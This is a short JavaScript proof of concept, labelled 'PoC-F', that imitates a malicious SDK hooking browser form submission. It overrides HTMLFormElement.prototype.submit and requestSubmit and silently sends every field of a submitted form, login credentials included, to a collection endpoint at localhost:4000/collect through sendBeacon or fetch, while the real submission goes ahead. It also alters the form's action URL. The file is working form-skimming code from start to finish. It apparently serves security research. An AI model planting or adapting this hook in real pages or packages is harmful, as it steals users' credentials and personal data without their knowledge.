(() => {
  if (HTMLFormElement.prototype.__pocF_patched__) return;
  Object.defineProperty(HTMLFormElement.prototype, "__pocF_patched__", {
    value: true, configurable: false, enumerable: false, writable: false,
  });

  const origSubmit = HTMLFormElement.prototype.submit;
  const origRequestSubmit = HTMLFormElement.prototype.requestSubmit;

  function hookLogic(form, submitter) {
    console.log("[PoC-F] hook fired", {
      action: form.action,
      method: form.method,
      hasSubmitter: !!submitter,
      ts: Date.now(),
    });

    // (추가) 최소 피해 시연: 폼 데이터를 3rd-party 수집 엔드포인트로 동시에 유출
    // - 서버(/login)는 정상 처리되지만, 4000(/collect)에도 찍히게 만들기
    try {
      const fd = new FormData(form);

      fd.append("__poc", "F");
      fd.append("via", "sdk_proto_hook");
      fd.append("page", location.href);
      fd.append("action", String(form.action || ""));
      fd.append("ts", String(Date.now()));

      const body = new URLSearchParams();
      for (const [k, v] of fd.entries()) {
        body.append(k, typeof v === "string" ? v : "[blob]");
      }

      const url = "http://localhost:4000/collect";

      let ok = false;
      try {
        if (navigator.sendBeacon) {
          ok = navigator.sendBeacon(url, body);
        }
      } catch (_) {}

      if (!ok) {
        try {
          fetch(url, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
            body: body.toString(),
            keepalive: true,
          }).catch(() => {});
        } catch (_) {}
      }
    } catch {}

    try {
      const u = new URL(form.action, location.href);
      u.searchParams.set("via", "sdk");
      form.action = u.toString();
    } catch {}
  }

  Object.defineProperty(HTMLFormElement.prototype, "submit", {
    configurable: true,
    enumerable: false,
    writable: true,
    value: function patchedSubmit() {
      hookLogic(this, null);
      return origSubmit.call(this);
    },
  });

  if (typeof origRequestSubmit === "function") {
    Object.defineProperty(HTMLFormElement.prototype, "requestSubmit", {
      configurable: true,
      enumerable: false,
      writable: true,
      value: function patchedRequestSubmit(submitter) {
        hookLogic(this, submitter || null);
        return origRequestSubmit.call(this, submitter);
      },
    });
  }

  console.log("[PoC-F] prototype patched", {
    submit_is_native_before: /\[native code\]/.test(Function.prototype.toString.call(origSubmit)),
    requestSubmit_exists: typeof origRequestSubmit === "function",
  });
})();

